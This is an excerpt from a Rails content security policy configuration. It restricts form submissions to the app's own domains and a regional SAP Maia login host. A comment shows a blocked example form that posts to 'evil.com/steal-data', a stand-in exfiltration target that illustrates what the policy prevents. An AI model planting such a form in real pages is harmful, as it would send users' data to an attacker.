...
Rails.application.config.content_security_policy do |policy|
  ...
  # "maia.REGION.cloud.sap" = allow the Maia dashboard POST login form
  ...
  #            <form action="https://maia.REGION.cloud.sap/monsoon3">
  # ❌ Blocked: <form action="https://evil.com/steal-data" method="post">
  policy.form_action :self, *domains, "maia.#{region}.cloud.sap"
